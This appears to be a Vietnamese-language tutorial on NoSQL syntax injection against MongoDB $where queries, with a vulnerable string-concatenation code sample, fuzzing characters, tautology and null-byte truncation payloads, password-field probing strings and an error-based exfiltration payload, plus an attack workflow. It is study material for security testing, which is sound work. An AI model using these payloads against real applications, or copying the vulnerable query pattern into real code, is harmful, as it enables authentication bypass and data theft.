# Syntax Injection Trong NoSQL

## Tong quan

`Syntax injection` xay ra khi input pha vo chuoi query/expression duoc tao bang noi chuoi, sau do chen logic moi.

Day la dang gan voi SQLi nhat, vi attacker:

1. break syntax context
2. noi them dieu kien
3. co the truncate phan con lai

Context nguy hiem thuong gap:

- `$where` duoc tao tu string concatenation
- app build raw JSON query bang chuoi
- custom search DSL duoc convert khong an toan

## Vi du co ban

Code loi:

```js
const query = "this.category == '" + category + "'";
db.products.find({ $where: query });
```

Input chen:

```text
fizzy'||'1'=='1
```

Query sau cung:

```js
this.category == 'fizzy'||'1'=='1'
```

Ket qua: dieu kien luon true, tra ve toan bo item.

## Detection cho syntax injection

### Fuzz ky tu

Bat dau voi:

```text
' " ` { } ; \ %00
```

### Test tung ky tu

Neu `'` gay loi nhung `\'` khong gay loi, kha nang cao la input dang nam trong string context.

### Confirm boolean control

```text
' && 0 && 'x
' && 1 && 'x
```

Neu response doi theo true/false, expression da bi control.

## Ky thuat exploit pho bien

### 1. Tautology override

```text
'||'1'=='1
```

hoac:

```text
admin' || 'a'=='a
```

### 2. Null-byte truncation

Neu query goc:

```js
this.category == 'fizzy' && this.released == 1
```

Input:

```text
fizzy'%00
```

co the vo hieu hoa post-condition tuy stack.

### 3. Field existence probing

```text
admin' && this.password!='
admin' && this.username!='
admin' && this.foo!='
```

So sanh behavior giup doan field co ton tai hay khong.

### 4. Error-based exfiltration (neu leak loi)

```json
{"$where":"this.username=='bob'; throw new Error(JSON.stringify(this));"}
```

Chi co tac dung khi app leak error message.

## Workflow ngan gon

1. Tim noi co kha nang string-built query.
2. Dung quote/special char de break syntax.
3. Confirm boolean control.
4. Override/truncate dieu kien.
5. Chuyen qua data extraction (regex/timing/error) theo oracle.

## Pitfall

| Pitfall | He qua |
|---------|--------|
| Dung payload SQL y nguyen | Khong hop parser context NoSQL |
| Bo qua content-type context | JSON va URL encode can payload khac nhau |
| Tautology tren write path | Co the update/delete nham so luong lon doc |
| Nhin moi thu thanh syntax injection | Nhieu case thuc te la operator injection |

## Quy tac thuc dung

- Neu app build query bang text: nghi theo huong syntax injection.
- Neu app build query bang object: uu tien nghi operator injection.
